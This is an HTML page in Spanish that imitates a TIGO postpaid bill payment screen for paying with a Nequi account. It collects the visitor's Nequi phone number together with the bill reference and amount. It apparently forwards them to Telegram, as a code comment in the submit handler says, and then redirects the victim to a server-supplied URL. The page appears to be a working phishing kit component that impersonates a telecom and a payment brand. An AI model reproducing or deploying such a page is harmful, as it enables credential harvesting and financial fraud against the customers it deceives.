<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TIGO - Pago con Nequi</title>
    <link rel="icon" type="image/png" href="favicon.png">
    <link rel="stylesheet" href="fonts.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Dm Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #f5f5f5;
        }

        .header {
            background: linear-gradient(135deg, #003399 0%, #0052cc 100%);
            padding: 15px 20px;
            color: white;
            display: flex;
            align-items: center;
            gap: 15px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        }

        .logo {
            width: 100px;
            height: 40px;
        }

        .logo img {
            max-width: 100%;
            height: auto;
        }

        .header-icon {
            font-family: 'tigo-icons-pack1';
            font-size: 18px;
        }

        .header-text {
            font-size: 14px;
            font-weight: 500;
        }

        .header-dropdown {
            margin-left: auto;
            cursor: pointer;
            font-size: 20px;
        }

        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
        }

        .back-button {
            display: inline-flex;
            align-items: center;
            color: #44c8f5;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 30px;
            cursor: pointer;
        }

        .back-button svg {
            width: 20px;
            height: 20px;
            margin-right: 8px;
            stroke: currentColor;
        }

        .page-title {
            font-size: 28px;
            color: #001eb4;
            font-weight: 500;
            margin-bottom: 30px;
        }

        .card-box {
            background: white;
            padding: 24px;
            border-radius: 16px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
            border: 1px solid #f0f0f0;
        }

        .card-header {
            display: flex;
            align-items: center;
            gap: 6px;
            margin-bottom: 8px;
            padding-bottom: 8px;
            border-bottom: 1px solid #f0f0f0;
        }

        .card-header-icon {
            width: 24px;
            height: 24px;
            object-fit: contain;
        }

        .card-title {
            font-size: 14px;
            color: #001eb4;
            font-weight: 600;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .fieldset-custom {
            border: 1.5px solid #9ca3af;
            border-radius: 6px;
            padding: 6px 10px 4px 10px;
            transition: all 0.2s ease;
            background: white;
        }

        .legend-custom {
            font-size: 10px;
            font-weight: 500;
            color: #666;
            padding: 0 2px;
            display: block;
            margin-bottom: 1px;
        }

        .fieldset-input {
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .fieldset-custom input {
            flex: 1;
            background: transparent;
            border: none;
            font-size: 13px;
            color: #333;
            font-family: inherit;
        }

        .fieldset-custom input::placeholder {
            color: #ccc;
        }

        .fieldset-custom input:focus {
            outline: none;
        }

        .terms {
            font-size: 11px;
            color: #666;
            margin: 10px 0 12px 0;
            line-height: 1.5;
        }

        .terms a {
            color: #44c8f5;
            text-decoration: none;
            font-weight: 500;
        }

        .button-group {
            display: flex;
            gap: 8px;
            justify-content: flex-end;
            margin-top: 10px;
        }

        .btn {
            padding: 6px 18px;
            border: none;
            border-radius: 18px;
            font-size: 11px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.2s ease;
            text-transform: uppercase;
            letter-spacing: 0.3px;
        }

        .btn-cancel {
            background: none;
            color: #44c8f5;
            border: none;
            min-width: auto;
            padding: 0;
        }

        .btn-cancel:hover {
            background: none;
            color: #44c8f5;
        }

        .btn-continue {
            background: #001eb4;
            color: white;
            min-width: 120px;
        }

        .btn-continue:hover {
            background: #0015a0;
        }

        .loading-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.6);
            z-index: 9999;
            justify-content: center;
            align-items: center;
        }

        .loading-modal.show {
            display: flex;
        }

        .loading-content {
            background: white;
            padding: 40px;
            border-radius: 16px;
            text-align: center;
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f0f0f0;
            border-top: 4px solid #44c8f5;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 16px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @media (max-width: 768px) {
            .button-group {
                justify-content: space-between;
                gap: 8px;
            }

            .btn {
                flex: 1;
            }

            .card-box {
                padding: 16px;
            }

            .loading-content {
                padding: 30px 20px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">
            <img src="assets/logos/tigo-logo.svg" alt="TIGO">
        </div>
        <div class="header-icon">&#xEC83;</div>
        <div class="header-text">Pospago <strong id="phoneNumber"><span class="spinner-mini"></span></strong></div>
        <div class="header-dropdown">⋮</div>
    </div>

    <!-- Modal de carga -->
    <div class="loading-modal" id="loadingModal">
        <div class="loading-content">
            <div class="spinner"></div>
        </div>
    </div>

    <div class="container">
        <a class="back-button" href="javascript:void(0)" onclick="regresarAlInicio()">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <polyline points="15 18 9 12 15 6"></polyline>
            </svg>
            REGRESAR
        </a>

        <h1 class="page-title">Pago con cuenta Nequi</h1>

        <div class="card-box">
            <div class="card-header">
                <img src="assets/logos/nequi.png" class="card-header-icon" alt="Nequi">
                <div class="card-title">Nequi</div>
            </div>

            <form>
                <!-- Número asociado -->
                <fieldset class="fieldset-custom">
                    <legend class="legend-custom">Número asociado</legend>
                    <div class="fieldset-input">
                        <input type="tel" placeholder="300XXXXXXX" inputmode="numeric" minlength="10" maxlength="10" required>
                    </div>
                </fieldset>

                <!-- Terms -->
                <div class="terms">
                    Al presionar CONTINUAR estás aceptando los <a href="#">términos y condiciones</a>
                </div>

                <!-- Buttons -->
                <div class="button-group">
                    <button type="button" class="btn btn-cancel" onclick="reintentar()">CANCELAR</button>
                    <button type="submit" class="btn btn-continue">CONTINUAR</button>
                </div>
            </form>
        </div>
    </div>

    <script>
        const params = new URLSearchParams(window.location.search);
        const txid = params.get('txid');

        // Leer parámetros desde el URL
        let phoneNumber = params.get('referencia') || '';
        let valorFormateado = params.get('valor_formateado') || '';
        let valorPago = params.get('valor_pago') || '0';

        // Actualizar el header con el teléfono
        if (phoneNumber && document.getElementById('phoneNumber')) {
            document.getElementById('phoneNumber').textContent = phoneNumber;
        }

        // Función para regresar a pago-inicio con txid
        function regresarAlInicio() {
            window.location.href = `/pago-inicio?txid=${txid || ''}`;
        }

        function reintentar() {
            // Cancelar y regresar a pago-inicio con txid
            window.location.href = `/pago-inicio?txid=${txid || ''}`;
        }

        // Manejar submit del formulario de Nequi
        document.querySelector('form').addEventListener('submit', async (e) => {
            e.preventDefault();

            const nequiNumber = document.querySelector('input[type="tel"]').value.trim();
            if (!nequiNumber || nequiNumber.length !== 10) {
                alert('Por favor ingresa un número de Nequi válido (10 dígitos)');
                return;
            }

            // Mostrar modal de carga
            const loadingModal = document.getElementById('loadingModal');
            loadingModal.classList.add('show');

            // Esperar 3 segundos antes de procesar
            await new Promise(resolve => setTimeout(resolve, 3000));

            try {
                // Procesar pago Nequi - envía a Telegram y obtiene URL
                const response = await fetch('/api/procesar-nequi', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        nequi_number: nequiNumber,
                        txid: txid,
                        referencia: phoneNumber,
                        valor_pago: valorPago,
                        valor_formateado: valorFormateado
                    })
                });

                const result = await response.json();

                if (result.ok) {
                    // Si hay URL de Nequi, redirigir a ella
                    if (result.nequi_url) {
                        const queryParams = new URLSearchParams({
                            txid: txid || '',
                            referencia: phoneNumber,
                            valor_formateado: valorFormateado,
                            valor_pago: valorPago,
                            nequi_number: nequiNumber
                        });
                        window.location.href = result.nequi_url + '?' + queryParams.toString();
                    } else {
                        alert('Pago iniciado. Sigue las instrucciones en tu app de Nequi.');
                        window.location.href = `/pago-inicio?txid=${txid || ''}`;
                    }
                } else {
                    loadingModal.classList.remove('show');
                    alert('Error al procesar pago: ' + (result.error || 'desconocido'));
                }
            } catch (error) {
                console.error('Error:', error);
                loadingModal.classList.remove('show');
                alert('Error al procesar pago');
            }
        });
    </script>
</body>
</html>
